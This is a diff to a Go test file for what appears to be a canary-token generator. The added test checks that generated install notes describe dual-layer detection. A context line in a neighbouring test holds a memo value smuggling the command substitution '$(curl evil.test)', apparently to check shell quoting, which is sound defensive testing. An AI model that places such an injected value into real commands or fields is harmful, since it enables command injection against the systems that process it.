@@ -63,6 +63,39 @@ func TestForgeSVG(t *testing.T) {
 	}
 }
 
+func TestInstallNotesDualLayerGuidance(t *testing.T) {
+	dir := t.TempDir()
+	res, err := forge.Run(forge.Options{
+		Type: "env", Name: "secrets", Detect: "both",
+		Collector: "https://beacon.example.com", AuthzRef: "LAB-1",
+		OutDir: dir, KeyPath: filepath.Join(dir, "k"),
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	body, err := os.ReadFile(res.InstallPath)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(string(body), "package agent") || !strings.Contains(string(body), "Dual-layer") {
+		t.Fatalf("detect=both install notes should mention package agent dual-layer; got:\n%s", body)
+	}
+	res2, err := forge.Run(forge.Options{
+		Type: "env", Name: "agentonly", Detect: "sentinel",
+		AuthzRef: "LAB-1", OutDir: dir, KeyPath: filepath.Join(dir, "k"),
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	body2, err := os.ReadFile(res2.InstallPath)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(string(body2), "--detect both") {
+		t.Fatalf("detect=sentinel notes should prefer --detect both; got:\n%s", body2)
+	}
+}
+
 func TestInstallNotesQuoteMemoAgainstShell(t *testing.T) {
 	dir := t.TempDir()
 	memo := "lab; $(curl evil.test) 'x'"
